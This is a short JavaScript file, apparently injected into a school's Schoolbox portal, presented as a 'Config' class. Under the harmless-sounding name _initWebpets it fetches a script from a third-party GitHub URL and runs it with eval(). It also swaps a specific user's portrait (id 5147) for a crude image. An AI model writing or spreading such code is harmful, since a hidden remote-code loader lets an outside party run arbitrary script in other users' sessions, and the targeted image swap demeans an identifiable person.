class Config {
  constructor(data = {}) {
    this.data = data;
    if (this.data.profile)  this._applyAvatars();
    if (this.data.webpets)  this._initWebpets();
    this._cleanNotifications();
  }

  _applyAvatars() {
    const pfp   = 'https://github.com/jk-dr/p/blob/main/IMG_4440.png?raw=true';
    const chode = 'https://github.com/jk-dr/p/blob/main/chode.png?raw=true';

    document.querySelector('#profile-drop img').src = pfp;
    document.querySelector('#profile-accordion img').src = pfp;
    document.querySelectorAll('[src="/portrait.php?id=5147&size=square64"]')
      .forEach(e => e.src = chode);
  }

  _initWebpets() {
    (async () => {const code = await (await fetch('https://raw.githubusercontent.com/jk-dr/p/main/webpets.js')).text();eval(code);})();
  }

  _cleanNotifications() {
    document.querySelector('#notificationselector_ext')
      ?.closest('li.actions-small-1.status-read')
      ?.remove();
  }

  static async init() {
    try {
      const html = await (await fetch('https://portal.tintern.vic.edu.au/eportfolio/1773/6128')).text();
      const doc  = new DOMParser().parseFromString(html, 'text/html');
      const data = JSON.parse(doc.getElementById('page-anchor-' + window.schoolboxUser.id)?.textContent ?? '{}');
      return new Config(data);
    } catch (e) {
      console.warn('[Config] init failed:', e);
      return new Config();
    }
  }
}

const config = await Config.init();
